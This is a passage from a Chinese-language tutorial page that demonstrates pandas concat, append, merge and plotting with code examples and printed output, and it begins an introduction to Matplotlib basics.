class="line">print(res)</span><br><span class="line"><span class="comment">#     b    c    d</span></span><br><span class="line"><span class="comment"># 0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 1  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 2  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 3  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 4  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 5  1.0  1.0  1.0</span></span><br></pre></td></tr></table></figure><h5 id="join-axes-已失效"><a href="#join-axes-已失效" class="headerlink" title="join_axes (已失效)"></a>join_axes (已失效)</h5><h5 id="添加数据（append-）"><a href="#添加数据（append-）" class="headerlink" title="添加数据（append ）"></a>添加数据（append ）</h5><p><code>append</code>只有纵向合并，没有横向合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义资料集</span></span><br><span class="line">df1 = pd.DataFrame(np.ones((<span class="number">3</span>,<span class="number">4</span>))*<span class="number">0</span>, columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">df2 = pd.DataFrame(np.ones((<span class="number">3</span>,<span class="number">4</span>))*<span class="number">1</span>, columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">df3 = pd.DataFrame(np.ones((<span class="number">3</span>,<span class="number">4</span>))*<span class="number">1</span>, columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">s1 = pd.Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], index=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#将df2合并到df1的下面，以及重置index，并打印出结果</span></span><br><span class="line">res = df1.append(df2, ignore_index=<span class="keyword">True</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#     a    b    c    d</span></span><br><span class="line"><span class="comment"># 0  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 3  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 4  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 5  1.0  1.0  1.0  1.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#合并多个df，将df2与df3合并至df1的下面，以及重置index，并打印出结果</span></span><br><span class="line">res = df1.append([df2, df3], ignore_index=<span class="keyword">True</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#     a    b    c    d</span></span><br><span class="line"><span class="comment"># 0  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 3  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 4  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 5  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 6  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 7  1.0  1.0  1.0  1.0</span></span><br><span class="line"><span class="comment"># 8  1.0  1.0  1.0  1.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#合并series，将s1合并至df1，以及重置index，并打印出结果</span></span><br><span class="line">res = df1.append(s1, ignore_index=<span class="keyword">True</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#     a    b    c    d</span></span><br><span class="line"><span class="comment"># 0  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 1  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 2  0.0  0.0  0.0  0.0</span></span><br><span class="line"><span class="comment"># 3  1.0  2.0  3.0  4.0</span></span><br></pre></td></tr></table></figure><h4 id="合并-merge"><a href="#合并-merge" class="headerlink" title="合并(merge)"></a>合并(merge)</h4><p><code>pandas</code>中的<code>merge</code>和<code>concat</code>类似,但主要是用于<strong>两组有key column的数据</strong>,统一索引的数据. 通常也被用在Database的处理当中.</p><h5 id="依据一组key合并"><a href="#依据一组key合并" class="headerlink" title="依据一组key合并"></a>依据一组key合并</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义资料集并打印出</span></span><br><span class="line">left = pd.DataFrame(&#123;<span class="string">'key'</span>: [<span class="string">'K0'</span>, <span class="string">'K1'</span>, <span class="string">'K2'</span>, <span class="string">'K3'</span>],</span><br><span class="line">                             <span class="string">'A'</span>: [<span class="string">'A0'</span>, <span class="string">'A1'</span>, <span class="string">'A2'</span>, <span class="string">'A3'</span>],</span><br><span class="line">                             <span class="string">'B'</span>: [<span class="string">'B0'</span>, <span class="string">'B1'</span>, <span class="string">'B2'</span>, <span class="string">'B3'</span>]&#125;)</span><br><span class="line">right = pd.DataFrame(&#123;<span class="string">'key'</span>: [<span class="string">'K0'</span>, <span class="string">'K1'</span>, <span class="string">'K2'</span>, <span class="string">'K3'</span>],</span><br><span class="line">                              <span class="string">'C'</span>: [<span class="string">'C0'</span>, <span class="string">'C1'</span>, <span class="string">'C2'</span>, <span class="string">'C3'</span>],</span><br><span class="line">                              <span class="string">'D'</span>: [<span class="string">'D0'</span>, <span class="string">'D1'</span>, <span class="string">'D2'</span>, <span class="string">'D3'</span>]&#125;)</span><br><span class="line"></span><br><span class="line">print(left)</span><br><span class="line"><span class="comment">#    A   B key</span></span><br><span class="line"><span class="comment"># 0  A0  B0  K0</span></span><br><span class="line"><span class="comment"># 1  A1  B1  K1</span></span><br><span class="line"><span class="comment"># 2  A2  B2  K2</span></span><br><span class="line"><span class="comment"># 3  A3  B3  K3</span></span><br><span class="line"></span><br><span class="line">print(right)</span><br><span class="line"><span class="comment">#    C   D key</span></span><br><span class="line"><span class="comment"># 0  C0  D0  K0</span></span><br><span class="line"><span class="comment"># 1  C1  D1  K1</span></span><br><span class="line"><span class="comment"># 2  C2  D2  K2</span></span><br><span class="line"><span class="comment"># 3  C3  D3  K3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#依据key column合并，并打印出</span></span><br><span class="line">res = pd.merge(left, right, on=<span class="string">'key'</span>)</span><br><span class="line"></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#     A   B key   C   D</span></span><br><span class="line"><span class="comment"># 0  A0  B0  K0  C0  D0</span></span><br><span class="line"><span class="comment"># 1  A1  B1  K1  C1  D1</span></span><br><span class="line"><span class="comment"># 2  A2  B2  K2  C2  D2</span></span><br><span class="line"><span class="comment"># 3  A3  B3  K3  C3  D3</span></span><br></pre></td></tr></table></figure><h5 id="依据两组key合并"><a href="#依据两组key合并" class="headerlink" title="依据两组key合并"></a>依据两组key合并</h5><p>合并时有4种方法<code>how = [&#39;left&#39;, &#39;right&#39;, &#39;outer&#39;, &#39;inner&#39;]</code>，预设值<code>how=&#39;inner&#39;</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义资料集并打印出</span></span><br><span class="line">left = pd.DataFrame(&#123;<span class="string">'key1'</span>: [<span class="string">'K0'</span>, <span class="string">'K0'</span>, <span class="string">'K1'</span>, <span class="string">'K2'</span>],</span><br><span class="line">                      <span class="string">'key2'</span>: [<span class="string">'K0'</span>, <span class="string">'K1'</span>, <span class="string">'K0'</span>, <span class="string">'K1'</span>],</span><br><span class="line">                      <span class="string">'A'</span>: [<span class="string">'A0'</span>, <span class="string">'A1'</span>, <span class="string">'A2'</span>, <span class="string">'A3'</span>],</span><br><span class="line">                      <span class="string">'B'</span>: [<span class="string">'B0'</span>, <span class="string">'B1'</span>, <span class="string">'B2'</span>, <span class="string">'B3'</span>]&#125;)</span><br><span class="line">right = pd.DataFrame(&#123;<span class="string">'key1'</span>: [<span class="string">'K0'</span>, <span class="string">'K1'</span>, <span class="string">'K1'</span>, <span class="string">'K2'</span>],</span><br><span class="line">                       <span class="string">'key2'</span>: [<span class="string">'K0'</span>, <span class="string">'K0'</span>, <span class="string">'K0'</span>, <span class="string">'K0'</span>],</span><br><span class="line">                       <span class="string">'C'</span>: [<span class="string">'C0'</span>, <span class="string">'C1'</span>, <span class="string">'C2'</span>, <span class="string">'C3'</span>],</span><br><span class="line">                       <span class="string">'D'</span>: [<span class="string">'D0'</span>, <span class="string">'D1'</span>, <span class="string">'D2'</span>, <span class="string">'D3'</span>]&#125;)</span><br><span class="line"></span><br><span class="line">print(left)</span><br><span class="line"><span class="comment">#    A   B key1 key2</span></span><br><span class="line"><span class="comment"># 0  A0  B0   K0   K0</span></span><br><span class="line"><span class="comment"># 1  A1  B1   K0   K1</span></span><br><span class="line"><span class="comment"># 2  A2  B2   K1   K0</span></span><br><span class="line"><span class="comment"># 3  A3  B3   K2   K1</span></span><br><span class="line"></span><br><span class="line">print(right)</span><br><span class="line"><span class="comment">#    C   D key1 key2</span></span><br><span class="line"><span class="comment"># 0  C0  D0   K0   K0</span></span><br><span class="line"><span class="comment"># 1  C1  D1   K1   K0</span></span><br><span class="line"><span class="comment"># 2  C2  D2   K1   K0</span></span><br><span class="line"><span class="comment"># 3  C3  D3   K2   K0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#依据key1与key2 columns进行合并，并打印出四种结果['left', 'right', 'outer', 'inner']</span></span><br><span class="line">res = pd.merge(left, right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>], how=<span class="string">'inner'</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#    A   B key1 key2   C   D</span></span><br><span class="line"><span class="comment"># 0  A0  B0   K0   K0  C0  D0</span></span><br><span class="line"><span class="comment"># 1  A2  B2   K1   K0  C1  D1</span></span><br><span class="line"><span class="comment"># 2  A2  B2   K1   K0  C2  D2</span></span><br><span class="line"></span><br><span class="line">res = pd.merge(left, right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>], how=<span class="string">'outer'</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#     A    B key1 key2    C    D</span></span><br><span class="line"><span class="comment"># 0   A0   B0   K0   K0   C0   D0</span></span><br><span class="line"><span class="comment"># 1   A1   B1   K0   K1  NaN  NaN</span></span><br><span class="line"><span class="comment"># 2   A2   B2   K1   K0   C1   D1</span></span><br><span class="line"><span class="comment"># 3   A2   B2   K1   K0   C2   D2</span></span><br><span class="line"><span class="comment"># 4   A3   B3   K2   K1  NaN  NaN</span></span><br><span class="line"><span class="comment"># 5  NaN  NaN   K2   K0   C3   D3</span></span><br><span class="line"></span><br><span class="line">res = pd.merge(left, right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>], how=<span class="string">'left'</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#    A   B key1 key2    C    D</span></span><br><span class="line"><span class="comment"># 0  A0  B0   K0   K0   C0   D0</span></span><br><span class="line"><span class="comment"># 1  A1  B1   K0   K1  NaN  NaN</span></span><br><span class="line"><span class="comment"># 2  A2  B2   K1   K0   C1   D1</span></span><br><span class="line"><span class="comment"># 3  A2  B2   K1   K0   C2   D2</span></span><br><span class="line"><span class="comment"># 4  A3  B3   K2   K1  NaN  NaN</span></span><br><span class="line"></span><br><span class="line">res = pd.merge(left, right, on=[<span class="string">'key1'</span>, <span class="string">'key2'</span>], how=<span class="string">'right'</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#     A    B key1 key2   C   D</span></span><br><span class="line"><span class="comment"># 0   A0   B0   K0   K0  C0  D0</span></span><br><span class="line"><span class="comment"># 1   A2   B2   K1   K0  C1  D1</span></span><br><span class="line"><span class="comment"># 2   A2   B2   K1   K0  C2  D2</span></span><br><span class="line"><span class="comment"># 3  NaN  NaN   K2   K0  C3  D3</span></span><br></pre></td></tr></table></figure><h5 id="Indicator"><a href="#Indicator" class="headerlink" title="Indicator"></a>Indicator</h5><p><code>indicator=True</code>会将合并的记录放在新的一列。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义资料集并打印出</span></span><br><span class="line">df1 = pd.DataFrame(&#123;<span class="string">'col1'</span>:[<span class="number">0</span>,<span class="number">1</span>], <span class="string">'col_left'</span>:[<span class="string">'a'</span>,<span class="string">'b'</span>]&#125;)</span><br><span class="line">df2 = pd.DataFrame(&#123;<span class="string">'col1'</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>],<span class="string">'col_right'</span>:[<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>]&#125;)</span><br><span class="line"></span><br><span class="line">print(df1)</span><br><span class="line"><span class="comment">#   col1 col_left</span></span><br><span class="line"><span class="comment"># 0     0        a</span></span><br><span class="line"><span class="comment"># 1     1        b</span></span><br><span class="line"></span><br><span class="line">print(df2)</span><br><span class="line"><span class="comment">#   col1  col_right</span></span><br><span class="line"><span class="comment"># 0     1          2</span></span><br><span class="line"><span class="comment"># 1     2          2</span></span><br><span class="line"><span class="comment"># 2     2          2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 依据col1进行合并，并启用indicator=True，最后打印出</span></span><br><span class="line">res = pd.merge(df1, df2, on=<span class="string">'col1'</span>, how=<span class="string">'outer'</span>, indicator=<span class="keyword">True</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#     col1 col_left  col_right      _merge</span></span><br><span class="line"><span class="comment"># 0   0.0        a        NaN   left_only</span></span><br><span class="line"><span class="comment"># 1   1.0        b        2.0        both</span></span><br><span class="line"><span class="comment"># 2   2.0      NaN        2.0  right_only</span></span><br><span class="line"><span class="comment"># 3   2.0      NaN        2.0  right_only</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定indicator column的名称，并打印出</span></span><br><span class="line">res = pd.merge(df1, df2, on=<span class="string">'col1'</span>, how=<span class="string">'outer'</span>, indicator=<span class="string">'indicator_column'</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#   col1 col_left  col_right indicator_column</span></span><br><span class="line"><span class="comment"># 0   0.0        a        NaN        left_only</span></span><br><span class="line"><span class="comment"># 1   1.0        b        2.0             both</span></span><br><span class="line"><span class="comment"># 2   2.0      NaN        2.0       right_only</span></span><br><span class="line"><span class="comment"># 3   2.0      NaN        2.0       right_only</span></span><br></pre></td></tr></table></figure><h5 id="依据index合并"><a href="#依据index合并" class="headerlink" title="依据index合并"></a>依据index合并</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义资料集并打印出</span></span><br><span class="line">left = pd.DataFrame(&#123;<span class="string">'A'</span>: [<span class="string">'A0'</span>, <span class="string">'A1'</span>, <span class="string">'A2'</span>],</span><br><span class="line">                     <span class="string">'B'</span>: [<span class="string">'B0'</span>, <span class="string">'B1'</span>, <span class="string">'B2'</span>]&#125;,</span><br><span class="line">                     index=[<span class="string">'K0'</span>, <span class="string">'K1'</span>, <span class="string">'K2'</span>])</span><br><span class="line">right = pd.DataFrame(&#123;<span class="string">'C'</span>: [<span class="string">'C0'</span>, <span class="string">'C2'</span>, <span class="string">'C3'</span>],</span><br><span class="line">                      <span class="string">'D'</span>: [<span class="string">'D0'</span>, <span class="string">'D2'</span>, <span class="string">'D3'</span>]&#125;,</span><br><span class="line">                     index=[<span class="string">'K0'</span>, <span class="string">'K2'</span>, <span class="string">'K3'</span>])</span><br><span class="line"></span><br><span class="line">print(left)</span><br><span class="line"><span class="comment">#     A   B</span></span><br><span class="line"><span class="comment"># K0  A0  B0</span></span><br><span class="line"><span class="comment"># K1  A1  B1</span></span><br><span class="line"><span class="comment"># K2  A2  B2</span></span><br><span class="line"></span><br><span class="line">print(right)</span><br><span class="line"><span class="comment">#     C   D</span></span><br><span class="line"><span class="comment"># K0  C0  D0</span></span><br><span class="line"><span class="comment"># K2  C2  D2</span></span><br><span class="line"><span class="comment"># K3  C3  D3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#依据左右资料集的index进行合并，how='outer',并打印出</span></span><br><span class="line">res = pd.merge(left, right, left_index=<span class="keyword">True</span>, right_index=<span class="keyword">True</span>, how=<span class="string">'outer'</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#      A    B    C    D</span></span><br><span class="line"><span class="comment"># K0   A0   B0   C0   D0</span></span><br><span class="line"><span class="comment"># K1   A1   B1  NaN  NaN</span></span><br><span class="line"><span class="comment"># K2   A2   B2   C2   D2</span></span><br><span class="line"><span class="comment"># K3  NaN  NaN   C3   D3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#依据左右资料集的index进行合并，how='inner',并打印出</span></span><br><span class="line">res = pd.merge(left, right, left_index=<span class="keyword">True</span>, right_index=<span class="keyword">True</span>, how=<span class="string">'inner'</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#     A   B   C   D</span></span><br><span class="line"><span class="comment"># K0  A0  B0  C0  D0</span></span><br><span class="line"><span class="comment"># K2  A2  B2  C2  D2</span></span><br></pre></td></tr></table></figure><h5 id="解决overlapping的问题"><a href="#解决overlapping的问题" class="headerlink" title="解决overlapping的问题"></a>解决overlapping的问题</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义资料集</span></span><br><span class="line">boys = pd.DataFrame(&#123;<span class="string">'k'</span>: [<span class="string">'K0'</span>, <span class="string">'K1'</span>, <span class="string">'K2'</span>], <span class="string">'age'</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]&#125;)</span><br><span class="line">girls = pd.DataFrame(&#123;<span class="string">'k'</span>: [<span class="string">'K0'</span>, <span class="string">'K0'</span>, <span class="string">'K3'</span>], <span class="string">'age'</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用suffixes解决overlapping的问题</span></span><br><span class="line">res = pd.merge(boys, girls, on=<span class="string">'k'</span>, suffixes=[<span class="string">'_boy'</span>, <span class="string">'_girl'</span>], how=<span class="string">'inner'</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#    age_boy   k  age_girl</span></span><br><span class="line"><span class="comment"># 0        1  K0         4</span></span><br><span class="line"><span class="comment"># 1        1  K0         5</span></span><br></pre></td></tr></table></figure><h4 id="plot-出图"><a href="#plot-出图" class="headerlink" title="plot 出图"></a>plot 出图</h4><p>我们随机生成1000个数据，<code>Series</code> 默认的 <code>index</code> 就是从0开始的整数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机生成1000个数据</span></span><br><span class="line">data = pd.Series(np.random.randn(<span class="number">1000</span>), index=np.arange(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为了方便观看效果, 我们累加这个数据</span></span><br><span class="line">data.cumsum()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pandas 数据可以直接观看其可视化形式</span></span><br><span class="line">data.plot()</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h4 id="Dataframe-可视化"><a href="#Dataframe-可视化" class="headerlink" title="Dataframe 可视化"></a>Dataframe 可视化</h4><p>生成一个1000*4 的<code>DataFrame</code>，并对他们累加。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = pd.DataFrame(</span><br><span class="line">    np.random.randn(<span class="number">1000</span>,<span class="number">4</span>),</span><br><span class="line">    index=np.arange(<span class="number">1000</span>),</span><br><span class="line">    columns=list(<span class="string">"ABCD"</span>)</span><br><span class="line">    )</span><br><span class="line">data.cumsum()</span><br><span class="line">data.plot()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>分别给<code>x</code>, <code>y</code>指定数据，然后我们可以再画一个在同一个<code>ax</code>上面，选择不一样的数据列，不同的 <code>color</code> 和 <code>label</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">data = pd.DataFrame(</span><br><span class="line">    np.random.randn(1000,4),</span><br><span class="line">    index=np.arange(1000),</span><br><span class="line">    columns=list(&quot;ABCD&quot;)</span><br><span class="line">    )</span><br><span class="line">data.cumsum()</span><br><span class="line">data.plot()</span><br><span class="line">plt.show()</span><br><span class="line">ax = data.plot.scatter(x=&apos;A&apos;,y=&apos;B&apos;,color=&apos;DarkBlue&apos;,label=&apos;Class1&apos;)</span><br><span class="line"># 将之下这个 data 画在上一个 ax 上面</span><br><span class="line">data.plot.scatter(x=&apos;A&apos;,y=&apos;C&apos;,color=&apos;LightGreen&apos;,label=&apos;Class2&apos;,ax=ax)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h1 id="Matplotlib"><a href="#Matplotlib" class="headerlink" title="Matplotlib"></a>Matplotlib</h1><h2 id="官网地址（2021-4-20）"><a href="#官网地址（2021-4-20）" class="headerlink" title="官网地址（2021-4-20）"></a>官网地址（2021-4-20）</h2><p><a href="https://matplotlib.org/" target="_blank" rel="noopener">https://matplotlib.org/</a></p><p>Matplotlib可以画出美丽的：</p><ul><li>线图;</li><li>散点图;</li><li>等高线图;</li><li>条形图;</li><li>柱状图;</li><li>3D 图形,</li><li>甚至是图形动画等等.</li></ul><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="基础应用"><a href="#基础应用" class="headerlink" title="基础应用"></a>基础应用</h3><p>使用<code>import</code>导入模块<code>matplotlib.pyplot</code>，并简写成<code>plt</code>， 使用<code>import</code>导入模块<code>numpy</code>，并简写成<code>np</code>。</p><p>使用<code>np.linspace</code>定义x：范围是(-1,1);个数是50. 仿真一维数据组(<code>x</code> ,<code>y</code>)表示直线。</p><p>使用<code>plt.figure</code>定义一个图像窗口. 使用<code>plt.plot</code>画(<code>x</code> ,<code>y</code>)曲线. 使用<code>plt.show</code>显示图像。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.linspace(<span class="number">-1</span>, <span class="number">1</span>, <span class="number">50</span>)</span><br><span class="line">y = <span class="number">2</span>*x + <span class="number">1</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(x, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>matplotlib 的 figure 就是一个 单独的 figure 小窗口, 小窗口里面还可以有更多的小图片.</p><p>使用<code>plt.figure</code>定义一个图像窗口：编号为3；大小为(8, 